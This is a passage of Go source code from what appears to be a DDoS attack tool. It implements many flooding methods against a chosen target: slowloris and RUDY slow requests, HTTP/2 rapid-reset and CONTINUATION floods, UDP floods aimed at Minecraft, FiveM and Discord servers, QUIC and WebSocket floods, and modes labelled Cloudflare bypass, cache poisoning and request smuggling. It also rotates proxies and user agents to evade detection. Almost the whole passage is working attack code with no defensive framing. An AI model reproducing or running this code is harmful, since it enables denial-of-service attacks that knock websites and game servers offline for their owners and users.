			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		},
	})
	err = tlsConn.Handshake()
	tlsConn.Close()
	rawConn.Close()
	if err != nil {
		atomic.AddInt64(&totalFail, 1)
		return false
	}
	atomic.AddInt64(&totalSuccess, 1)
	atomic.AddInt64(&totalReq, 1)
	return true
}

func buildQUICInitial(host string) []byte {
	buf := make([]byte, 1200)
	rand.Read(buf)
	buf[0] = 0xC3
	copy(buf[1:5], []byte{0x00, 0x00, 0x00, 0x01})
	hostnameBytes := []byte(host)
	if len(hostnameBytes) > 253 {
		hostnameBytes = hostnameBytes[:253]
	}
	buf[5] = byte(len(hostnameBytes))
	copy(buf[6:], hostnameBytes)
	return buf
}

type slowReader struct {
	data  []byte
	pos   int
	delay time.Duration
	stop  <-chan struct{}
}

func (r *slowReader) Read(p []byte) (int, error) {
	select {
	case <-r.stop:
		return 0, io.EOF
	default:
	}
	if r.pos >= len(r.data) {
		r.pos = 0
	}
	p[0] = r.data[r.pos]
	r.pos++
	time.Sleep(r.delay)
	return 1, nil
}

type chunkDripReader struct {
	stop <-chan struct{}
}

func (r *chunkDripReader) Read(p []byte) (int, error) {
	select {
	case <-r.stop:
		return 0, io.EOF
	case <-time.After(time.Duration(500+rand.Intn(1500)) * time.Millisecond):
		n := copy(p, []byte(randString(10)))
		return n, nil
	}
}

func rudyRequest(client *http.Client, targetURL string, stop <-chan struct{}) bool {
	declaredSize := 1024*1024 + rand.Intn(50*1024*1024)
	chunk := []byte("comment=" + randString(50) + "&" + randString(10) + "=" + randString(20) + "&")
	slow := &slowReader{
		data:  chunk,
		delay: time.Duration(500+rand.Intn(2000)) * time.Millisecond,
		stop:  stop,
	}
	req, err := http.NewRequest("POST", targetURL+randomPath(), slow)
	if err != nil {
		return false
	}
	req.ContentLength = int64(declaredSize)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Referer", randomReferer())
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func chunkPostRequest(client *http.Client, targetURL string, stop <-chan struct{}) bool {
	body := io.NopCloser(&chunkDripReader{stop: stop})
	req, err := http.NewRequest("POST", targetURL+randomPath(), body)
	if err != nil {
		return false
	}
	req.ContentLength = -1
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Connection", "keep-alive")
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func rapidResetOnce(targetURL string) error {
	scheme, host, p, path := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName:         host,
		NextProtos:         []string{"h2"},
		InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return fmt.Errorf("h2 not negotiated")
	}
	tlsConn.Write([]byte(http2.ClientPreface))
	bw := bufio.NewWriterSize(tlsConn, 65536)
	framer := http2.NewFramer(bw, tlsConn)
	framer.AllowIllegalWrites = true

	var writeMu sync.Mutex
	writeMu.Lock()
	framer.WriteSettings(
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
	)
	bw.Flush()
	writeMu.Unlock()

	done := make(chan struct{})
	go func() {
		defer close(done)
		for {
			f, err := framer.ReadFrame()
			if err != nil {
				return
			}
			if sf, ok := f.(*http2.SettingsFrame); ok {
				if !sf.IsAck() {
					writeMu.Lock()
					framer.WriteSettingsAck()
					bw.Flush()
					writeMu.Unlock()
				}
			}
		}
	}()

	var hdrBuf bytes.Buffer
	enc := hpack.NewEncoder(&hdrBuf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUserAgent()})
	fragment := append([]byte(nil), hdrBuf.Bytes()...)

	var streamID uint32 = 1
	for i := 0; i < 100; i++ {
		select {
		case <-done:
			return fmt.Errorf("connection closed")
		default:
		}
		writeMu.Lock()
		err1 := framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      streamID,
			BlockFragment: fragment,
			EndStream:     true,
			EndHeaders:    true,
		})
		err2 := framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
		bw.Flush()
		writeMu.Unlock()
		if err1 != nil {
			return err1
		}
		if err2 != nil {
			return err2
		}
		atomic.AddInt64(&totalReq, 1)
		atomic.AddInt64(&totalSuccess, 1)
		atomic.AddInt64(&totalBytes, int64(len(fragment)+18))
		streamID += 2
		if streamID >= 1<<31-1 {
			break
		}
	}
	time.Sleep(10 * time.Millisecond)
	return nil
}

func h2ContOnce(targetURL string) error {
	scheme, host, p, path := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName:         host,
		NextProtos:         []string{"h2"},
		InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return fmt.Errorf("h2 not negotiated")
	}
	tlsConn.Write([]byte(http2.ClientPreface))
	bw := bufio.NewWriterSize(tlsConn, 65536)
	framer := http2.NewFramer(bw, tlsConn)
	framer.AllowIllegalWrites = true
	framer.WriteSettings()
	bw.Flush()

	go func() {
		for {
			if _, err := framer.ReadFrame(); err != nil {
				return
			}
		}
	}()

	var hdrBuf bytes.Buffer
	enc := hpack.NewEncoder(&hdrBuf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUserAgent()})
	fragment := append([]byte(nil), hdrBuf.Bytes()...)

	err = framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: fragment,
		EndStream:     false,
		EndHeaders:    false,
	})
	if err != nil {
		return err
	}
	for i := 0; i < 2000; i++ {
		if err := framer.WriteContinuation(1, false, fragment); err != nil {
			bw.Flush()
			return nil
		}
		atomic.AddInt64(&totalSuccess, 1)
		atomic.AddInt64(&totalBytes, int64(len(fragment)))
	}
	bw.Flush()
	return nil
}

func slowlorisOnce(targetURL string, stop <-chan struct{}) bool {
	scheme, host, p, _ := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return false
	}
	var conn net.Conn = rawConn
	if scheme != "http" {
		tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return false
		}
		conn = tlsConn
	}
	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", host, randomUserAgent())
	ticker := time.NewTicker(time.Duration(1+rand.Intn(3)) * time.Second)
	defer ticker.Stop()
	alive := true
	for alive {
		select {
		case <-stop:
			conn.Close()
			return true
		case <-ticker.C:
			_, err := fmt.Fprintf(conn, "X-%s: %s\r\n", randString(5), randString(10))
			if err != nil {
				alive = false
				break
			}
			atomic.AddInt64(&totalSuccess, 1)
		}
	}
	conn.Close()
	return false
}

func malformedOnce(targetURL string) error {
	scheme, host, p, _ := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	var conn net.Conn = rawConn
	if scheme != "http" {
		tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return err
		}
		conn = tlsConn
	}
	longURL := "/" + randString(8192)
	payload := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n", longURL, host, randomUserAgent())
	_, err = conn.Write([]byte(payload))
	conn.Close()
	if err != nil {
		return err
	}
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalSuccess, 1)
	atomic.AddInt64(&totalBytes, int64(len(payload)))
	return nil
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	rand.Read(payload)
	return payload
}

func writeVarInt(buf *bytes.Buffer, value int32) {
	for {
		temp := byte(value & 0x7F)
		value >>= 7
		if value != 0 {
			temp |= 0x80
		}
		buf.WriteByte(temp)
		if value == 0 {
			break
		}
	}
}

func minecraftWorker(ctx context.Context, host string, mcPort int) {
	addr := fmt.Sprintf("%s:%d", host, mcPort)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			conn, err := net.Dial("tcp", addr)
			if err != nil {
				continue
			}
			buf := new(bytes.Buffer)
			protocolVersion := int32(754)
			writeVarInt(buf, protocolVersion)
			writeVarInt(buf, int32(len(host)))
			buf.WriteString(host)
			binary.Write(buf, binary.BigEndian, uint16(mcPort))
			writeVarInt(buf, 1)
			handshakePacket := new(bytes.Buffer)
			writeVarInt(handshakePacket, int32(buf.Len()))
			handshakePacket.WriteByte(0x00)
			handshakePacket.Write(buf.Bytes())
			conn.Write(handshakePacket.Bytes())
			statusBuf := new(bytes.Buffer)
			writeVarInt(statusBuf, 1)
			statusBuf.WriteByte(0x00)
			conn.Write(statusBuf.Bytes())
			io.Copy(io.Discard, conn)
			conn.Close()
			atomic.AddInt64(&totalSuccess, 1)
		}
	}
}

type FivemWorker struct {
	Target string
	Port   int
	Burst  int
}

func (fw *FivemWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", fw.Target, fw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := []byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00")
	for {
		select {
		case <-ctx.Done():
			return
		default:
			for i := 0; i < fw.Burst; i++ {
				if _, err := conn.Write(payload); err == nil {
					atomic.AddInt64(&totalSuccess, 1)
					atomic.AddInt64(&totalBytes, int64(len(payload)))
				} else {
					atomic.AddInt64(&totalFail, 1)
				}
			}
		}
	}
}

type UDPDiscordWorker struct {
	Target string
	Port   int
}

func (uw *UDPDiscordWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			payload := discordPayloads[rand.Intn(len(discordPayloads))]
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(len(payload)))
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type UDPBypassWorker struct {
	Target string
	Port   int
}

func (uw *UDPBypassWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			size := rand.Intn(1200) + 50
			payload := generatePayload(size)
			if rand.Intn(3) == 0 {
				payload[0] = 0xFF
				payload[1] = 0xFF
				payload[2] = 0xFF
				payload[3] = 0xFF
			}
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(size))
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type UDPGbpsWorker struct {
	Target string
	Port   int
	Size   int
}

func (uw *UDPGbpsWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := generatePayload(uw.Size)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(uw.Size))
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type QUICFloodWorker struct {
	Target string
	Port   int
}

func (qw *QUICFloodWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", qw.Target, qw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	_, host, _, _ := parseTarget("https://" + qw.Target)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			payload := buildQUICInitial(host)
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(len(payload)))
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type WsFloodWorker struct {
	Target string
}

func (ww *WsFloodWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	wsURL := ww.Target
	if strings.HasPrefix(wsURL, "http://") {
		wsURL = "ws://" + wsURL[7:]
	} else if strings.HasPrefix(wsURL, "https://") {
		wsURL = "wss://" + wsURL[8:]
	} else if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
		wsURL = "wss://" + wsURL
	}
	var proxyURL *url.URL
	if len(proxies) > 0 {
		if px, err := url.Parse(proxies[rand.Intn(len(proxies))]); err == nil {
			proxyURL = px
		}
	}
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
	}
	if proxyURL != nil {
		dialer.Proxy = func(req *http.Request) (*url.URL, error) {
			return proxyURL, nil
		}
	}
	headers := http.Header{}
	headers.Set("User-Agent", randomUserAgent())
	headers.Set("Origin", ww.Target)
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		conn, _, err := dialer.Dial(wsURL, headers)
		if err != nil {
			atomic.AddInt64(&totalFail, 1)
			continue
		}
		go func() {
			for {
				if _, _, err := conn.ReadMessage(); err != nil {
					return
				}
			}
		}()
	inner:
		for {
			select {
			case <-ctx.Done():
				conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
				conn.Close()
				return
			default:
			}
			var werr error
			switch rand.Intn(5) {
			case 0:
				msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`, randString(8), randString(200+rand.Intn(2000)), time.Now().UnixNano())
				werr = conn.WriteMessage(websocket.TextMessage, []byte(msg))
			case 1:
				data := make([]byte, 1024+rand.Intn(7168))
				rand.Read(data)
				werr = conn.WriteMessage(websocket.BinaryMessage, data)
			case 2:
				werr = conn.WriteMessage(websocket.PingMessage, []byte(randString(16)))
			case 3:
				werr = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+rand.Intn(40960))))
			case 4:
				for j := 0; j < 10; j++ {
					if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(16))); e != nil {
						werr = e
						break
					}
					atomic.AddInt64(&totalSuccess, 1)
					atomic.AddInt64(&totalBytes, 16)
				}
			}
			if werr != nil {
				atomic.AddInt64(&totalFail, 1)
				conn.Close()
				break inner
			}
			atomic.AddInt64(&totalSuccess, 1)
		}
	}
}

type requestFunc func(client *http.Client, url string) bool

func spawnRequestWorkers(ctx context.Context, wg *sync.WaitGroup, url string, fn requestFunc) {
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					for j := 0; j < connections; j++ {
						if fn(client, url) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}
		}()
	}
}

func updateRPS() {
	now := time.Now()
	cur := atomic.LoadInt64(&totalReq)
	rpsMu.Lock()
	elapsed := now.Sub(lastSnapshot).Seconds()
	if elapsed > 0 {
		currentRPS = float64(cur-lastReq) / elapsed
	}
	lastReq = cur
	lastSnapshot = now
	rpsMu.Unlock()
}

func successRate() float64 {
	ok := atomic.LoadInt64(&totalSuccess)
	fail := atomic.LoadInt64(&totalFail)
	total := ok + fail
	if total == 0 {
		return 100.0
	}
	return float64(ok) / float64(total) * 100.0
}

func rateBar(rate float64, width int) string {
	filled := int(rate / 100.0 * float64(width))
	if filled > width {
		filled = width
	}
	bar := ""
	color := BGreen
	if rate < 50 {
		color = BRed
	} else if rate < 80 {
		color = BYellow
	}
	bar += color + strings.Repeat("█", filled) + Reset + Gray + strings.Repeat("░", width-filled) + Reset
	return bar
}

func statsReporter(ctx context.Context, totalDuration time.Duration) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	lastSnapshot = time.Now()
	lastReq = 0
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			updateRPS()
			reqs := atomic.LoadInt64(&totalReq)
			ok := atomic.LoadInt64(&totalSuccess)
			fail := atomic.LoadInt64(&totalFail)
			data := atomic.LoadInt64(&totalBytes)
			elapsed := time.Since(attackStart)
			remaining := totalDuration - elapsed
			if remaining < 0 {
				remaining = 0
			}

			rpsMu.Lock()
			rps := currentRPS
			rpsMu.Unlock()

			sr := successRate()
			bar := rateBar(sr, 20)

			line := fmt.Sprintf(
				" %sRPS%s: %-8.0f │ %sReq%s: %-8d │ %sOK%s: %-7d │ %sFail%s: %-7d │ %sData%s: %-10s │ %sElap%s: %s │ %sLeft%s: %s │ SR: [%s] %s%.1f%%%s ",
				BCyan, Reset, rps,
				BWhite, Reset, reqs,
				BGreen, Reset, ok,
				BRed, Reset, fail,
				Yellow, Reset, formatBytes(float64(data)),
				Gray, Reset, formatDuration(elapsed),
				Gray, Reset, formatDuration(remaining),
				bar, BWhite, sr, Reset,
			)
			fmt.Print("\r" + line)
		}
	}
}

func mparam(label, value, vcolor string) {
	content := " " + White + label + Reset + " : " + vcolor + value + Reset
	pad := 52 - len(label) - len(value)
	if pad < 1 {
		pad = 1
	}
	fmt.Println(Cyan + "║" + Reset + content + strings.Repeat(" ", pad) + Cyan + "║" + Reset)
}

func fparam(label, value string) {
	content := " " + White + label + Reset + " : " + BWhite + value + Reset
	pad := 52 - len(label) - len(value)
	if pad < 1 {
		pad = 1
	}
	fmt.Println(Magenta + "║" + Reset + content + strings.Repeat(" ", pad) + Magenta + "║" + Reset)
}

func printFinalStats(mode string) {
	elapsed := time.Since(attackStart).Seconds()
	if elapsed < 1 {
		elapsed = 1
	}
	reqs := atomic.LoadInt64(&totalReq)
	ok := atomic.LoadInt64(&totalSuccess)
	fail := atomic.LoadInt64(&totalFail)
	data := atomic.LoadInt64(&totalBytes)
	sr := successRate()
	fmt.Println()
	fmt.Println(Magenta + "╔" + strings.Repeat("═", 56) + "╗" + Reset)
	fmt.Println(Magenta + "║" + Reset + "  " + Magenta + "FINAL STATISTICS" + Reset + strings.Repeat(" ", 38) + Magenta + "║" + Reset)
	fmt.Println(Magenta + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
	fparam("Method", mode)
	fparam("Duration", fmt.Sprintf("%.0f seconds", elapsed))
	fparam("Requests", strconv.FormatInt(reqs, 10))
	fparam("Successful", strconv.FormatInt(ok, 10))
	fparam("Failed", strconv.FormatInt(fail, 10))
	fparam("Success Rate", fmt.Sprintf("%.2f%%", sr))
	fparam("Data Sent", formatBytes(float64(data)))
	fparam("Avg RPS", fmt.Sprintf("%.2f req/s", float64(reqs)/elapsed))
	fparam("Peak Data/s", formatBytes(float64(data)/elapsed))
	fmt.Println(Magenta + "╚" + strings.Repeat("═", 56) + "╝" + Reset)
	fmt.Println()
	fmt.Println(BGreen + "[+] Attack completed." + Reset)
}

func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName string) {
	switch mode {
	case "tls", "kraken":
		spawnRequestWorkers(ctx, wg, target, sendTLSRequest)
	case "http-flood":
		spawnRequestWorkers(ctx, wg, "http://"+hostName, sendTLSRequest)
	case "https-flood":
		spawnRequestWorkers(ctx, wg, target, sendTLSRequest)
	case "api-flood":
		spawnRequestWorkers(ctx, wg, target, apiFloodRequest)
	case "header-flood":
		spawnRequestWorkers(ctx, wg, target, headerFloodRequest)
	case "mixpost":
		spawnRequestWorkers(ctx, wg, target, mixPostRequest)
	case "cf-bypass":
		spawnRequestWorkers(ctx, wg, target, cfBypassRequest)
	case "range":
		spawnRequestWorkers(ctx, wg, target, rangeRequest)
	case "cookie-bomb":
		spawnRequestWorkers(ctx, wg, target, cookieBombRequest)
	case "cache-poison":
		spawnRequestWorkers(ctx, wg, target, cachePoisonRequest)
	case "gzip-bomb":
		spawnRequestWorkers(ctx, wg, target, gzipBombRequest)
	case "graphql-bomb":
		spawnRequestWorkers(ctx, wg, target, graphqlBombRequest)
	case "slowloris":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if slowlorisOnce(target, ctx.Done()) {
							atomic.AddInt64(&totalReq, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "rudy":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				client := newNoTimeoutClient()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if rudyRequest(client, target, ctx.Done()) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "chunk-post":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				client := newNoTimeoutClient()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if chunkPostRequest(client, target, ctx.Done()) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "rapid-reset":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := rapidResetOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "h2-cont":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := h2ContOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "ws-flood":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &WsFloodWorker{Target: target}
			go w.Start(ctx, wg)
		}
	case "malformed":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := malformedOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "http-smuggle":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if !httpSmuggleOnce(target) {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "tls-exhaust":
		_, hostName2, p2, _ := parseTarget(target)
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						tlsExhaustOnce(hostName2, p2)
					}
				}
			}()
		}
	case "quic-flood":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &QUICFloodWorker{Target: hostName, Port: port}
			go w.Start(ctx, wg)
		}
	case "udp-discord":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &UDPDiscordWorker{Target: hostName, Port: port}
			go w.Start(ctx, wg)
		}
	case "udp-bypass":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &UDPBypassWorker{Target: hostName, Port: port}
			go w.Start(ctx, wg)
		}
	case "udp-gbps":
		var pktSize int
		fmt.Print(Yellow + "Packet size (bytes, 50-1400): " + Reset)
		fmt.Scanf("%d\n", &pktSize)
		if pktSize < 50 {
			pktSize = 1400
		}
		if pktSize > 1400 {
			pktSize = 1400
		}
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &UDPGbpsWorker{Target: hostName, Port: port, Size: pktSize}
			go w.Start(ctx, wg)
		}
	case "fivem":
		var uploadMbps float64
		fmt.Print(Yellow + "Upload in Mbps (e.g., 0.84): " + Reset)
		fmt.Scanf("%f\n", &uploadMbps)
		if uploadMbps <= 0 {
			uploadMbps = 1.0
		}
		burst := int(uploadMbps * 1_000_000 / 120)
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &FivemWorker{Target: hostName, Port: port, Burst: burst}
			go w.Start(ctx, wg)
		}
	case "minecraft":
		for i := 0; i < connections; i++ {
			wg.Add(1)
			go minecraftWorker(ctx, hostName, port)
		}
	case "hybrid":
		quarter := workers / 4
		if quarter < 1 {
			quarter = 1
		}
		for i := 0; i < quarter; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
				for {
					select {
					case <-ctx.Done():
						return
					default:
						for j := 0; j < connections; j++ {
							if cfBypassRequest(client, target) {
								atomic.AddInt64(&totalSuccess, 1)
							} else {
								atomic.AddInt64(&totalFail, 1)
							}
						}
					}
				}
			}()
		}
		for i := 0; i < quarter; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
				for {
					select {
					case <-ctx.Done():
						return
					default:
						for j := 0; j < connections; j++ {
							if apiFloodRequest(client, target) {
								atomic.AddInt64(&totalSuccess, 1)
							} else {
								atomic.AddInt64(&totalFail, 1)
							}
						}
					}
				}
			}()
		}
		for i := 0; i < quarter; i++ {
			wg.Add(1)
			w := &WsFloodWorker{Target: target}
			go w.Start(ctx, wg)
		}
		for i := 0; i < quarter; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := rapidResetOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "apocalypse":
		eighth := workers / 8
		if eighth < 1 {
			eighth = 1
		}
		spawnN := func(n int, fn func()) {
			for i := 0; i < n; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					fn()
				}()
			}
		}
		spawnN(eighth, func() {
			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					for j := 0; j < connections; j++ {
						if cfBypassRequest(client, target) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}
		})
		spawnN(eighth, func() {
			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					for j := 0; j < connections; j++ {
						if apiFloodRequest(client, target) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}
		})
		spawnN(eighth, func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if err := rapidResetOnce(target); err != nil {
						atomic.AddInt64(&totalFail, 1)
					}
				}
			}
		})
		spawnN(eighth, func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if slowlorisOnce(target, ctx.Done()) {
						atomic.AddInt64(&totalReq, 1)
					} else {
						atomic.AddInt64(&totalFail, 1)
					}
				}
			}
		})
		spawnN(eighth, func() {
			client := newNoTimeoutClient()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if rudyRequest(client, target, ctx.Done()) {
						atomic.AddInt64(&totalSuccess, 1)
					} else {
						atomic.AddInt64(&totalFail, 1)
					}
				}
			}
		})
		spawnN(eighth, func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if err := h2ContOnce(target); err != nil {
						atomic.AddInt64(&totalFail, 1)
					}
				}
			}
		})
		spawnN(eighth, func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if !httpSmuggleOnce(target) {
						atomic.AddInt64(&totalFail, 1)
					}
				}
			}
		})
		spawnN(eighth, func() {
			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					for j := 0; j < connections; j++ {
						if graphqlBombRequest(client, target) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}
		})
	default:
		fmt.Println(BRed + "[-] Unknown method: " + mode + Reset)
	}
}

func runAttack() {
	reader := bufio.NewReader(os.Stdin)
	userAgents = loadListFromFile("useragent.txt")
	referers = loadListFromFile("referers.txt")
	proxies = loadListFromFile("http.txt")
	if len(userAgents) == 0 {
		userAgents = defaultUserAgents
	}
	if len(referers) == 0 {
		referers = defaultReferers
	}

